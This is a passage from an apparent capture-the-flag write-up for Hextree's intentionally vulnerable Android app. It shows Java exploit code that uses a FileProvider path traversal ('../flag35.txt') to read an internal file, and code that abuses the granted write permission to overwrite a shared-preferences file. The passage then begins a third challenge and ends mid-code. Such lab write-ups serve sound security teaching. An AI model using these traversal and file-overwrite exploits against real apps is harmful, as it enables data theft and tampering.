+<span id="cb13-6"><a href="#cb13-6" aria-hidden="true" tabindex="-1"></a>        <span class="bu">String</span> stringExtra <span class="op">=</span> <span class="fu">getIntent</span><span class="op">().</span><span class="fu">getStringExtra</span><span class="op">(</span><span class="st">&quot;filename&quot;</span><span class="op">);</span></span>
+<span id="cb13-7"><a href="#cb13-7" aria-hidden="true" tabindex="-1"></a>        <span class="cf">if</span> <span class="op">(</span>stringExtra <span class="op">!=</span> <span class="kw">null</span><span class="op">)</span> <span class="op">{</span></span>
+<span id="cb13-8"><a href="#cb13-8" aria-hidden="true" tabindex="-1"></a>            <span class="fu">prepareFlag</span><span class="op">(</span><span class="kw">this</span><span class="op">,</span> stringExtra<span class="op">);</span></span>
+<span id="cb13-9"><a href="#cb13-9" aria-hidden="true" tabindex="-1"></a>            Uri uriForFile <span class="op">=</span> FileProvider<span class="op">.</span><span class="fu">getUriForFile</span><span class="op">(</span><span class="kw">this</span><span class="op">,</span> <span class="st">&quot;io.hextree.root&quot;</span><span class="op">,</span> <span class="kw">new</span> <span class="bu">File</span><span class="op">(</span><span class="fu">getFilesDir</span><span class="op">(),</span> stringExtra<span class="op">));</span></span>
+<span id="cb13-10"><a href="#cb13-10" aria-hidden="true" tabindex="-1"></a>            Intent intent <span class="op">=</span> <span class="kw">new</span> <span class="fu">Intent</span><span class="op">();</span></span>
+<span id="cb13-11"><a href="#cb13-11" aria-hidden="true" tabindex="-1"></a>            intent<span class="op">.</span><span class="fu">setData</span><span class="op">(</span>uriForFile<span class="op">);</span></span>
+<span id="cb13-12"><a href="#cb13-12" aria-hidden="true" tabindex="-1"></a>            intent<span class="op">.</span><span class="fu">addFlags</span><span class="op">(</span><span class="dv">3</span><span class="op">);</span></span>
+<span id="cb13-13"><a href="#cb13-13" aria-hidden="true" tabindex="-1"></a>            <span class="fu">setResult</span><span class="op">(</span><span class="dv">0</span><span class="op">,</span> intent<span class="op">);</span></span>
+<span id="cb13-14"><a href="#cb13-14" aria-hidden="true" tabindex="-1"></a>            <span class="cf">return</span><span class="op">;</span></span>
+<span id="cb13-15"><a href="#cb13-15" aria-hidden="true" tabindex="-1"></a>        <span class="op">}</span></span>
+<span id="cb13-16"><a href="#cb13-16" aria-hidden="true" tabindex="-1"></a>        Uri uriForFile2 <span class="op">=</span> FileProvider<span class="op">.</span><span class="fu">getUriForFile</span><span class="op">(</span><span class="kw">this</span><span class="op">,</span> <span class="st">&quot;io.hextree.root&quot;</span><span class="op">,</span> <span class="kw">new</span> <span class="bu">File</span><span class="op">(</span><span class="fu">getFilesDir</span><span class="op">(),</span> <span class="st">&quot;secret.txt&quot;</span><span class="op">));</span></span>
+<span id="cb13-17"><a href="#cb13-17" aria-hidden="true" tabindex="-1"></a>        Intent intent2 <span class="op">=</span> <span class="kw">new</span> <span class="fu">Intent</span><span class="op">();</span></span>
+<span id="cb13-18"><a href="#cb13-18" aria-hidden="true" tabindex="-1"></a>        intent2<span class="op">.</span><span class="fu">setData</span><span class="op">(</span>uriForFile2<span class="op">);</span></span>
+<span id="cb13-19"><a href="#cb13-19" aria-hidden="true" tabindex="-1"></a>        intent2<span class="op">.</span><span class="fu">addFlags</span><span class="op">(</span><span class="dv">3</span><span class="op">);</span></span>
+<span id="cb13-20"><a href="#cb13-20" aria-hidden="true" tabindex="-1"></a>        <span class="fu">setResult</span><span class="op">(-</span><span class="dv">1</span><span class="op">,</span> intent2<span class="op">);</span></span>
+<span id="cb13-21"><a href="#cb13-21" aria-hidden="true" tabindex="-1"></a>    <span class="op">}</span></span>
+<span id="cb13-22"><a href="#cb13-22" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span></code></pre></div>
+<p>The target flag is located at <code>/data/data/io.hextree.attacksurface/flag35.txt</code>.</p>
+<p>Although the code attempts to base the file lookup in <code>getFilesDir()</code> (which maps to <code>/data/data/.../files/</code>), the application does not sanitize the filename input. This allows for a <strong>Path Traversal</strong> attack.</p>
+<p>Because the <code>FileProvider</code> is configured with <code>&lt;root-path path="/"/&gt;</code>, it will successfully generate a URI for a file even if we traverse outside the intended <code>files/</code> directory.</p>
+<p>We can exploit this by passing <code>../flag35.txt</code> as the filename. This resolves the path to the parent directory where the flag resides.</p>
+<div class="sourceCode" id="cb14"><pre class="sourceCode java"><code class="sourceCode java"><span id="cb14-1"><a href="#cb14-1" aria-hidden="true" tabindex="-1"></a><span class="kw">public</span> <span class="kw">class</span> MainActivity <span class="kw">extends</span> AppCompatActivity <span class="op">{</span></span>
+<span id="cb14-2"><a href="#cb14-2" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb14-3"><a href="#cb14-3" aria-hidden="true" tabindex="-1"></a>    <span class="at">@Override</span></span>
+<span id="cb14-4"><a href="#cb14-4" aria-hidden="true" tabindex="-1"></a>    <span class="kw">protected</span> <span class="dt">void</span> <span class="fu">onCreate</span><span class="op">(</span>Bundle savedInstanceState<span class="op">)</span> <span class="op">{</span></span>
+<span id="cb14-5"><a href="#cb14-5" aria-hidden="true" tabindex="-1"></a>        <span class="kw">...</span></span>
+<span id="cb14-6"><a href="#cb14-6" aria-hidden="true" tabindex="-1"></a>        Intent intent <span class="op">=</span> <span class="kw">new</span> <span class="fu">Intent</span><span class="op">();</span></span>
+<span id="cb14-7"><a href="#cb14-7" aria-hidden="true" tabindex="-1"></a>        intent<span class="op">.</span><span class="fu">setClassName</span><span class="op">(</span><span class="st">&quot;io.hextree.attacksurface&quot;</span><span class="op">,</span> <span class="st">&quot;io.hextree.attacksurface.activities.Flag35Activity&quot;</span><span class="op">);</span></span>
+<span id="cb14-8"><a href="#cb14-8" aria-hidden="true" tabindex="-1"></a>        intent<span class="op">.</span><span class="fu">putExtra</span><span class="op">(</span><span class="st">&quot;filename&quot;</span><span class="op">,</span> <span class="st">&quot;../flag35.txt&quot;</span><span class="op">);</span></span>
+<span id="cb14-9"><a href="#cb14-9" aria-hidden="true" tabindex="-1"></a>        <span class="fu">startActivityForResult</span><span class="op">(</span>intent<span class="op">,</span> <span class="dv">1</span><span class="op">);</span></span>
+<span id="cb14-10"><a href="#cb14-10" aria-hidden="true" tabindex="-1"></a>    <span class="op">}</span></span>
+<span id="cb14-11"><a href="#cb14-11" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb14-12"><a href="#cb14-12" aria-hidden="true" tabindex="-1"></a>    <span class="at">@Override</span></span>
+<span id="cb14-13"><a href="#cb14-13" aria-hidden="true" tabindex="-1"></a>    <span class="kw">protected</span> <span class="dt">void</span> <span class="fu">onActivityResult</span><span class="op">(</span><span class="dt">int</span> requestCode<span class="op">,</span> <span class="dt">int</span> resultCode<span class="op">,</span> <span class="at">@Nullable</span> Intent data<span class="op">)</span> <span class="op">{</span></span>
+<span id="cb14-14"><a href="#cb14-14" aria-hidden="true" tabindex="-1"></a>        <span class="kw">super</span><span class="op">.</span><span class="fu">onActivityResult</span><span class="op">(</span>requestCode<span class="op">,</span> resultCode<span class="op">,</span> data<span class="op">);</span></span>
+<span id="cb14-15"><a href="#cb14-15" aria-hidden="true" tabindex="-1"></a>        Uri uri <span class="op">=</span> data<span class="op">.</span><span class="fu">getData</span><span class="op">();</span></span>
+<span id="cb14-16"><a href="#cb14-16" aria-hidden="true" tabindex="-1"></a>        Log<span class="op">.</span><span class="fu">d</span><span class="op">(</span><span class="st">&quot;uri&quot;</span><span class="op">,</span> uri<span class="op">.</span><span class="fu">toString</span><span class="op">());</span></span>
+<span id="cb14-17"><a href="#cb14-17" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb14-18"><a href="#cb14-18" aria-hidden="true" tabindex="-1"></a>        <span class="cf">try</span> <span class="op">{</span></span>
+<span id="cb14-19"><a href="#cb14-19" aria-hidden="true" tabindex="-1"></a>            <span class="bu">InputStream</span> isr <span class="op">=</span> <span class="fu">getContentResolver</span><span class="op">().</span><span class="fu">openInputStream</span><span class="op">(</span>uri<span class="op">);</span></span>
+<span id="cb14-20"><a href="#cb14-20" aria-hidden="true" tabindex="-1"></a>            <span class="bu">BufferedReader</span> reader <span class="op">=</span> <span class="kw">new</span> <span class="bu">BufferedReader</span><span class="op">(</span><span class="kw">new</span> <span class="bu">InputStreamReader</span><span class="op">(</span>isr<span class="op">));</span></span>
+<span id="cb14-21"><a href="#cb14-21" aria-hidden="true" tabindex="-1"></a>            <span class="bu">String</span> line<span class="op">;</span></span>
+<span id="cb14-22"><a href="#cb14-22" aria-hidden="true" tabindex="-1"></a>            <span class="cf">while</span> <span class="op">((</span>line <span class="op">=</span> reader<span class="op">.</span><span class="fu">readLine</span><span class="op">())</span> <span class="op">!=</span> <span class="kw">null</span><span class="op">)</span> <span class="op">{</span></span>
+<span id="cb14-23"><a href="#cb14-23" aria-hidden="true" tabindex="-1"></a>                Log<span class="op">.</span><span class="fu">d</span><span class="op">(</span><span class="st">&quot;line&quot;</span><span class="op">,</span> line<span class="op">);</span></span>
+<span id="cb14-24"><a href="#cb14-24" aria-hidden="true" tabindex="-1"></a>            <span class="op">}</span></span>
+<span id="cb14-25"><a href="#cb14-25" aria-hidden="true" tabindex="-1"></a>            reader<span class="op">.</span><span class="fu">close</span><span class="op">();</span></span>
+<span id="cb14-26"><a href="#cb14-26" aria-hidden="true" tabindex="-1"></a>            isr<span class="op">.</span><span class="fu">close</span><span class="op">();</span></span>
+<span id="cb14-27"><a href="#cb14-27" aria-hidden="true" tabindex="-1"></a>        <span class="op">}</span> <span class="cf">catch</span> <span class="op">(</span><span class="bu">IOException</span> e<span class="op">)</span> <span class="op">{</span></span>
+<span id="cb14-28"><a href="#cb14-28" aria-hidden="true" tabindex="-1"></a>            <span class="cf">throw</span> <span class="kw">new</span> <span class="bu">RuntimeException</span><span class="op">(</span>e<span class="op">);</span></span>
+<span id="cb14-29"><a href="#cb14-29" aria-hidden="true" tabindex="-1"></a>        <span class="op">}</span></span>
+<span id="cb14-30"><a href="#cb14-30" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb14-31"><a href="#cb14-31" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb14-32"><a href="#cb14-32" aria-hidden="true" tabindex="-1"></a>    <span class="op">}</span></span>
+<span id="cb14-33"><a href="#cb14-33" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span></code></pre></div>
+<pre><code>...  uri    ... D  content://io.hextree.root/root_files/data/data/io.hextree.attacksurface/flag35.txt
+...  line   ... D  HXT{...}</code></pre>
+<h3 id="write-access">Write access</h3>
+<p><strong>The impact of being able to write to an app’s internal files can be severe, depending on which files are affected. Large, complex applications often use internal storage for a variety of purposes; for example, they may store and load native libraries from it. If you are able to overwrite such a native library, this can lead to remote code execution.</strong></p>
+<p>Let’s start by analyzing the manifest for the <code>io.hextree.attacksurface</code> app. We see a <code>Flag36Activity</code> defined as follows:</p>
+<div class="sourceCode" id="cb16"><pre class="sourceCode xml"><code class="sourceCode xml"><span id="cb16-1"><a href="#cb16-1" aria-hidden="true" tabindex="-1"></a>&lt;<span class="kw">activity</span></span>
+<span id="cb16-2"><a href="#cb16-2" aria-hidden="true" tabindex="-1"></a><span class="ot">    android:name=</span><span class="st">&quot;io.hextree.attacksurface.activities.Flag36Activity&quot;</span></span>
+<span id="cb16-3"><a href="#cb16-3" aria-hidden="true" tabindex="-1"></a><span class="ot">    android:exported=</span><span class="st">&quot;true&quot;</span>/&gt;</span></code></pre></div>
+<div class="sourceCode" id="cb17"><pre class="sourceCode java"><code class="sourceCode java"><span id="cb17-1"><a href="#cb17-1" aria-hidden="true" tabindex="-1"></a><span class="kw">public</span> <span class="kw">class</span> Flag36Activity <span class="kw">extends</span> AppCompactActivity <span class="op">{</span></span>
+<span id="cb17-2"><a href="#cb17-2" aria-hidden="true" tabindex="-1"></a>    <span class="kw">...</span></span>
+<span id="cb17-3"><a href="#cb17-3" aria-hidden="true" tabindex="-1"></a>    <span class="kw">public</span> <span class="fu">Flag36Activity</span><span class="op">()</span> <span class="op">{</span><span class="kw">...</span><span class="op">}</span></span>
+<span id="cb17-4"><a href="#cb17-4" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb17-5"><a href="#cb17-5" aria-hidden="true" tabindex="-1"></a>    <span class="at">@Override</span></span>
+<span id="cb17-6"><a href="#cb17-6" aria-hidden="true" tabindex="-1"></a>    <span class="kw">protected</span> <span class="dt">void</span> <span class="fu">onCreate</span><span class="op">(</span>Bundle bundle<span class="op">)</span> <span class="op">{</span></span>
+<span id="cb17-7"><a href="#cb17-7" aria-hidden="true" tabindex="-1"></a>        <span class="kw">super</span><span class="op">.</span><span class="fu">onCreate</span><span class="op">(</span>bundle<span class="op">);</span></span>
+<span id="cb17-8"><a href="#cb17-8" aria-hidden="true" tabindex="-1"></a>        <span class="kw">this</span><span class="op">.</span><span class="fu">f</span> <span class="op">=</span> <span class="kw">new</span> <span class="fu">LogHelper</span><span class="op">(</span><span class="kw">this</span><span class="op">);</span></span>
+<span id="cb17-9"><a href="#cb17-9" aria-hidden="true" tabindex="-1"></a>        <span class="kw">this</span><span class="op">.</span><span class="fu">f</span><span class="op">.</span><span class="fu">addTag</span><span class="op">(</span><span class="bu">Boolean</span><span class="op">.</span><span class="fu">valueOf</span><span class="op">(</span>Flag36Preferences<span class="op">.</span><span class="fu">getBoolean</span><span class="op">(</span><span class="st">&quot;solved&quot;</span><span class="op">,</span> <span class="kw">false</span><span class="op">)));</span></span>
+<span id="cb17-10"><a href="#cb17-10" aria-hidden="true" tabindex="-1"></a>        <span class="cf">if</span> <span class="op">(</span>Flag36Preferences<span class="op">.</span><span class="fu">getBoolean</span><span class="op">(</span><span class="st">&quot;solved&quot;</span><span class="op">,</span> <span class="kw">false</span><span class="op">))</span> <span class="op">{</span></span>
+<span id="cb17-11"><a href="#cb17-11" aria-hidden="true" tabindex="-1"></a>            <span class="kw">this</span><span class="op">.</span><span class="fu">f</span><span class="op">.</span><span class="fu">addTag</span><span class="op">(</span>Flag36Preferences<span class="op">.</span><span class="fu">class</span><span class="op">);</span></span>
+<span id="cb17-12"><a href="#cb17-12" aria-hidden="true" tabindex="-1"></a>            <span class="fu">success</span><span class="op">(</span><span class="kw">this</span><span class="op">);</span></span>
+<span id="cb17-13"><a href="#cb17-13" aria-hidden="true" tabindex="-1"></a>        <span class="op">}</span> <span class="cf">else</span> <span class="op">{</span></span>
+<span id="cb17-14"><a href="#cb17-14" aria-hidden="true" tabindex="-1"></a>            Log<span class="op">.</span><span class="fu">i</span><span class="op">(</span><span class="st">&quot;Flag36&quot;</span><span class="op">,</span> <span class="st">&quot;Not solved yet: </span><span class="sc">\&quot;</span><span class="st">solved=false</span><span class="sc">\&quot;</span><span class="st"> in the `Flag36Preferences` shared preferences&quot;</span><span class="op">);</span></span>
+<span id="cb17-15"><a href="#cb17-15" aria-hidden="true" tabindex="-1"></a>        <span class="op">}</span></span>
+<span id="cb17-16"><a href="#cb17-16" aria-hidden="true" tabindex="-1"></a>    <span class="op">}</span></span>
+<span id="cb17-17"><a href="#cb17-17" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span></code></pre></div>
+<p>The activity checks a boolean value named “solved” within the <code>Flag36Preferences</code> Shared Preferences file. By default, this value is false. To capture the flag, we must modify this value to true. We can achieve this by leveraging a previously identified path-traversal vulnerability in <code>Flag35Activity</code>. <code>Flag35Activity</code> returns a URI with permission flags set to <code>3</code> - <code>intent.addFlags(3)</code> - (which represents <code>FLAG_GRANT_READ_URI_PERMISSION | FLAG_GRANT_WRITE_URI_PERMISSION</code>). This grants us the ability to both read and overwrite files accessible via the provider.</p>
+<p>So we can trigger <code>Flag35Activity</code> with a path traversal payload pointing to the <code>Flag36Preferences.xml</code> file, reads the content, replace <code>false</code> with <code>true</code> and write the content back to the file.</p>
+<div class="sourceCode" id="cb18"><pre class="sourceCode java"><code class="sourceCode java"><span id="cb18-1"><a href="#cb18-1" aria-hidden="true" tabindex="-1"></a><span class="kw">public</span> <span class="kw">class</span> MainActivity <span class="kw">extends</span> AppCompatActivity <span class="op">{</span></span>
+<span id="cb18-2"><a href="#cb18-2" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb18-3"><a href="#cb18-3" aria-hidden="true" tabindex="-1"></a>    <span class="at">@Override</span></span>
+<span id="cb18-4"><a href="#cb18-4" aria-hidden="true" tabindex="-1"></a>    <span class="kw">protected</span> <span class="dt">void</span> <span class="fu">onCreate</span><span class="op">(</span>Bundle savedInstanceState<span class="op">)</span> <span class="op">{</span></span>
+<span id="cb18-5"><a href="#cb18-5" aria-hidden="true" tabindex="-1"></a>        <span class="kw">...</span></span>
+<span id="cb18-6"><a href="#cb18-6" aria-hidden="true" tabindex="-1"></a>        Intent intent <span class="op">=</span> <span class="kw">new</span> <span class="fu">Intent</span><span class="op">();</span></span>
+<span id="cb18-7"><a href="#cb18-7" aria-hidden="true" tabindex="-1"></a>        intent<span class="op">.</span><span class="fu">setClassName</span><span class="op">(</span><span class="st">&quot;io.hextree.attacksurface&quot;</span><span class="op">,</span> <span class="st">&quot;io.hextree.attacksurface.activities.Flag35Activity&quot;</span><span class="op">);</span></span>
+<span id="cb18-8"><a href="#cb18-8" aria-hidden="true" tabindex="-1"></a>        intent<span class="op">.</span><span class="fu">putExtra</span><span class="op">(</span><span class="st">&quot;filename&quot;</span><span class="op">,</span> <span class="st">&quot;../shared_prefs/Flag36Preferences.xml&quot;</span><span class="op">);</span></span>
+<span id="cb18-9"><a href="#cb18-9" aria-hidden="true" tabindex="-1"></a>        <span class="fu">startActivityForResult</span><span class="op">(</span>intent<span class="op">,</span> <span class="dv">1</span><span class="op">);</span></span>
+<span id="cb18-10"><a href="#cb18-10" aria-hidden="true" tabindex="-1"></a>    <span class="op">}</span></span>
+<span id="cb18-11"><a href="#cb18-11" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb18-12"><a href="#cb18-12" aria-hidden="true" tabindex="-1"></a>    <span class="at">@Override</span></span>
+<span id="cb18-13"><a href="#cb18-13" aria-hidden="true" tabindex="-1"></a>    <span class="kw">protected</span> <span class="dt">void</span> <span class="fu">onActivityResult</span><span class="op">(</span><span class="dt">int</span> requestCode<span class="op">,</span> <span class="dt">int</span> resultCode<span class="op">,</span> <span class="at">@Nullable</span> Intent data<span class="op">)</span> <span class="op">{</span></span>
+<span id="cb18-14"><a href="#cb18-14" aria-hidden="true" tabindex="-1"></a>        <span class="kw">super</span><span class="op">.</span><span class="fu">onActivityResult</span><span class="op">(</span>requestCode<span class="op">,</span> resultCode<span class="op">,</span> data<span class="op">);</span></span>
+<span id="cb18-15"><a href="#cb18-15" aria-hidden="true" tabindex="-1"></a>        Uri uri <span class="op">=</span> data<span class="op">.</span><span class="fu">getData</span><span class="op">();</span></span>
+<span id="cb18-16"><a href="#cb18-16" aria-hidden="true" tabindex="-1"></a>        Log<span class="op">.</span><span class="fu">d</span><span class="op">(</span><span class="st">&quot;uri&quot;</span><span class="op">,</span> uri<span class="op">.</span><span class="fu">toString</span><span class="op">());</span></span>
+<span id="cb18-17"><a href="#cb18-17" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb18-18"><a href="#cb18-18" aria-hidden="true" tabindex="-1"></a>        <span class="cf">try</span> <span class="op">{</span></span>
+<span id="cb18-19"><a href="#cb18-19" aria-hidden="true" tabindex="-1"></a>            <span class="co">// Read the file</span></span>
+<span id="cb18-20"><a href="#cb18-20" aria-hidden="true" tabindex="-1"></a>            <span class="bu">InputStream</span> isr <span class="op">=</span> <span class="fu">getContentResolver</span><span class="op">().</span><span class="fu">openInputStream</span><span class="op">(</span>uri<span class="op">);</span></span>
+<span id="cb18-21"><a href="#cb18-21" aria-hidden="true" tabindex="-1"></a>            <span class="bu">BufferedReader</span> reader <span class="op">=</span> <span class="kw">new</span> <span class="bu">BufferedReader</span><span class="op">(</span><span class="kw">new</span> <span class="bu">InputStreamReader</span><span class="op">(</span>isr<span class="op">));</span></span>
+<span id="cb18-22"><a href="#cb18-22" aria-hidden="true" tabindex="-1"></a>            <span class="bu">String</span> line<span class="op">;</span></span>
+<span id="cb18-23"><a href="#cb18-23" aria-hidden="true" tabindex="-1"></a>            <span class="bu">StringBuilder</span> text <span class="op">=</span> <span class="kw">new</span> <span class="bu">StringBuilder</span><span class="op">();</span></span>
+<span id="cb18-24"><a href="#cb18-24" aria-hidden="true" tabindex="-1"></a>            <span class="cf">while</span> <span class="op">((</span>line <span class="op">=</span> reader<span class="op">.</span><span class="fu">readLine</span><span class="op">())</span> <span class="op">!=</span> <span class="kw">null</span><span class="op">)</span> <span class="op">{</span></span>
+<span id="cb18-25"><a href="#cb18-25" aria-hidden="true" tabindex="-1"></a>                text<span class="op">.</span><span class="fu">append</span><span class="op">(</span>line<span class="op">).</span><span class="fu">append</span><span class="op">(</span><span class="st">&quot;</span><span class="sc">\n</span><span class="st">&quot;</span><span class="op">);</span></span>
+<span id="cb18-26"><a href="#cb18-26" aria-hidden="true" tabindex="-1"></a>            <span class="op">}</span></span>
+<span id="cb18-27"><a href="#cb18-27" aria-hidden="true" tabindex="-1"></a>            reader<span class="op">.</span><span class="fu">close</span><span class="op">();</span></span>
+<span id="cb18-28"><a href="#cb18-28" aria-hidden="true" tabindex="-1"></a>            isr<span class="op">.</span><span class="fu">close</span><span class="op">();</span></span>
+<span id="cb18-29"><a href="#cb18-29" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb18-30"><a href="#cb18-30" aria-hidden="true" tabindex="-1"></a>            <span class="co">// Modify the content</span></span>
+<span id="cb18-31"><a href="#cb18-31" aria-hidden="true" tabindex="-1"></a>            <span class="bu">String</span> updatedText <span class="op">=</span> text<span class="op">.</span><span class="fu">toString</span><span class="op">().</span><span class="fu">replace</span><span class="op">(</span><span class="st">&quot;false&quot;</span><span class="op">,</span> <span class="st">&quot;true&quot;</span><span class="op">);</span></span>
+<span id="cb18-32"><a href="#cb18-32" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb18-33"><a href="#cb18-33" aria-hidden="true" tabindex="-1"></a>            <span class="co">// Write the content</span></span>
+<span id="cb18-34"><a href="#cb18-34" aria-hidden="true" tabindex="-1"></a>            <span class="bu">OutputStream</span> os <span class="op">=</span> <span class="fu">getContentResolver</span><span class="op">().</span><span class="fu">openOutputStream</span><span class="op">(</span>uri<span class="op">,</span> <span class="st">&quot;wt&quot;</span><span class="op">);</span></span>
+<span id="cb18-35"><a href="#cb18-35" aria-hidden="true" tabindex="-1"></a>            <span class="bu">BufferedWriter</span> writer <span class="op">=</span> <span class="kw">new</span> <span class="bu">BufferedWriter</span><span class="op">(</span><span class="kw">new</span> <span class="bu">OutputStreamWriter</span><span class="op">(</span>os<span class="op">));</span></span>
+<span id="cb18-36"><a href="#cb18-36" aria-hidden="true" tabindex="-1"></a>            writer<span class="op">.</span><span class="fu">write</span><span class="op">(</span>updatedText<span class="op">);</span></span>
+<span id="cb18-37"><a href="#cb18-37" aria-hidden="true" tabindex="-1"></a>            writer<span class="op">.</span><span class="fu">flush</span><span class="op">();</span></span>
+<span id="cb18-38"><a href="#cb18-38" aria-hidden="true" tabindex="-1"></a>            writer<span class="op">.</span><span class="fu">close</span><span class="op">();</span></span>
+<span id="cb18-39"><a href="#cb18-39" aria-hidden="true" tabindex="-1"></a>            os<span class="op">.</span><span class="fu">close</span><span class="op">();</span></span>
+<span id="cb18-40"><a href="#cb18-40" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb18-41"><a href="#cb18-41" aria-hidden="true" tabindex="-1"></a>        <span class="op">}</span> <span class="cf">catch</span> <span class="op">(</span><span class="bu">IOException</span> e<span class="op">)</span> <span class="op">{</span></span>
+<span id="cb18-42"><a href="#cb18-42" aria-hidden="true" tabindex="-1"></a>            <span class="cf">throw</span> <span class="kw">new</span> <span class="bu">RuntimeException</span><span class="op">(</span>e<span class="op">);</span></span>
+<span id="cb18-43"><a href="#cb18-43" aria-hidden="true" tabindex="-1"></a>        <span class="op">}</span></span>
+<span id="cb18-44"><a href="#cb18-44" aria-hidden="true" tabindex="-1"></a>    <span class="op">}</span></span>
+<span id="cb18-45"><a href="#cb18-45" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span></code></pre></div>
+<h3 id="vulnerability-in-consuming-fileprovider">Vulnerability in consuming FileProvider</h3>
+<p>Previously, we examined vulnerabilities on the “sending” side where apps insecurely expose content. Now, we shift our focus to the “receiving” side. A significant threat model exists where applications expect to consume data from an external ContentProvider/FileProvider. If the receiving app trusts the structure or content of the returned data without validation, it can be exploited.</p>
+<p>The <code>Flag37Activity</code> accepts a data URI from an Intent and performs two checks before releasing the flag:</p>
+<ol type="1">
+<li><strong>Metadata check</strong>: It queries the URI and expects specific column values: <code>_display_name</code> must be <code>../flag37.txt</code> and <code>_size</code> must be <code>1337</code>.</li>
+<li><strong>Content check</strong>: It opens an <code>InputStream</code> from the URI and reads the content. The content must equal <code>give flag</code></li>
+</ol>
+<div class="sourceCode" id="cb19"><pre class="sourceCode java"><code class="sourceCode java"><span id="cb19-1"><a href="#cb19-1" aria-hidden="true" tabindex="-1"></a><span class="kw">public</span> <span class="kw">class</span> Flag37Activity <span class="kw">extends</span> AppCompactActivity <span class="op">{</span></span>
+<span id="cb19-2"><a href="#cb19-2" aria-hidden="true" tabindex="-1"></a>    <span class="kw">public</span> <span class="fu">Flag37Activity</span><span class="op">()</span> <span class="op">{</span><span class="kw">...</span><span class="op">}</span></span>
+<span id="cb19-3"><a href="#cb19-3" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb19-4"><a href="#cb19-4" aria-hidden="true" tabindex="-1"></a>    <span class="at">@Override</span></span>
+<span id="cb19-5"><a href="#cb19-5" aria-hidden="true" tabindex="-1"></a>    <span class="kw">protected</span> <span class="dt">void</span> <span class="fu">onCreate</span><span class="op">(</span>Bundle bundle<span class="op">)</span> <span class="op">{</span></span>
+<span id="cb19-6"><a href="#cb19-6" aria-hidden="true" tabindex="-1"></a>        <span class="kw">super</span><span class="op">.</span><span class="fu">onCreate</span><span class="op">(</span>bundle<span class="op">);</span></span>
+<span id="cb19-7"><a href="#cb19-7" aria-hidden="true" tabindex="-1"></a>        Uri data <span class="op">=</span> <span class="fu">getIntent</span><span class="op">().</span><span class="fu">getData</span><span class="op">();</span></span>
+<span id="cb19-8"><a href="#cb19-8" aria-hidden="true" tabindex="-1"></a>        <span class="bu">Cursor</span> cursorQuery <span class="op">=</span> <span class="kw">null</span><span class="op">;</span></span>
+<span id="cb19-9"><a href="#cb19-9" aria-hidden="true" tabindex="-1"></a>        <span class="cf">try</span> <span class="op">{</span></span>
+<span id="cb19-10"><a href="#cb19-10" aria-hidden="true" tabindex="-1"></a>            <span class="cf">try</span> <span class="op">{</span></span>
+<span id="cb19-11"><a href="#cb19-11" aria-hidden="true" tabindex="-1"></a>                cursorQuery <span class="op">=</span> <span class="fu">getContentResolver</span><span class="op">().</span><span class="fu">query</span><span class="op">(</span>data<span class="op">,</span> <span class="kw">null</span><span class="op">,</span> <span class="kw">null</span><span class="op">,</span> <span class="kw">null</span><span class="op">,</span> <span class="kw">null</span><span class="op">);</span></span>
+<span id="cb19-12"><a href="#cb19-12" aria-hidden="true" tabindex="-1"></a>                <span class="cf">if</span> <span class="op">(</span>cursorQuery <span class="op">!=</span> <span class="kw">null</span> <span class="op">&amp;&amp;</span> cursorQuery<span class="op">.</span><span class="fu">moveToFirst</span><span class="op">())</span> <span class="op">{</span></span>
+<span id="cb19-13"><a href="#cb19-13" aria-hidden="true" tabindex="-1"></a>                    <span class="bu">String</span> string <span class="op">=</span> cursorQuery<span class="op">.</span><span class="fu">getString</span><span class="op">(</span>cursorQuery<span class="op">.</span><span class="fu">getColumnIndex</span><span class="op">(</span><span class="st">&quot;_display_name&quot;</span><span class="op">));</span></span>
+<span id="cb19-14"><a href="#cb19-14" aria-hidden="true" tabindex="-1"></a>                    <span class="dt">long</span> j <span class="op">=</span> cursorQuery<span class="op">.</span><span class="fu">getLong</span><span class="op">(</span>cursorQuery<span class="op">.</span><span class="fu">getColumnIndex</span><span class="op">(</span><span class="st">&quot;_size&quot;</span><span class="op">));</span></span>
+<span id="cb19-15"><a href="#cb19-15" aria-hidden="true" tabindex="-1"></a>                    <span class="cf">if</span> <span class="op">(</span><span class="st">&quot;../flag37.txt&quot;</span><span class="op">.</span><span class="fu">equals</span><span class="op">(</span>string<span class="op">)</span> <span class="op">&amp;&amp;</span> j <span class="op">==</span> <span class="dv">1337</span><span class="op">)</span> <span class="op">{</span></span>
+<span id="cb19-16"><a href="#cb19-16" aria-hidden="true" tabindex="-1"></a>                        <span class="bu">InputStream</span> inputStreamOpenInputStream <span class="op">=</span> <span class="fu">getContentResolver</span><span class="op">().</span><span class="fu">openInputStream</span><span class="op">(</span>data<span class="op">);</span></span>
+<span id="cb19-17"><a href="#cb19-17" aria-hidden="true" tabindex="-1"></a>                        <span class="cf">if</span> <span class="op">(</span>inputStreamOpenInputStream <span class="op">!=</span> <span class="kw">null</span><span class="op">)</span> <span class="op">{</span></span>
+<span id="cb19-18"><a href="#cb19-18" aria-hidden="true" tabindex="-1"></a>                            <span class="bu">BufferedReader</span> bufferedReader <span class="op">=</span> <span class="kw">new</span> <span class="bu">BufferedReader</span><span class="op">(</span><span class="kw">new</span> <span class="bu">InputStreamReader</span><span class="op">(</span>inputStreamOpenInputStream<span class="op">));</span></span>
+<span id="cb19-19"><a href="#cb19-19" aria-hidden="true" tabindex="-1"></a>                            <span class="bu">StringBuilder</span> sb <span class="op">=</span> <span class="kw">new</span> <span class="bu">StringBuilder</span><span class="op">();</span></span>
+<span id="cb19-20"><a href="#cb19-20" aria-hidden="true" tabindex="-1"></a>                            <span class="cf">while</span> <span class="op">(</span><span class="kw">true</span><span class="op">)</span> <span class="op">{</span></span>
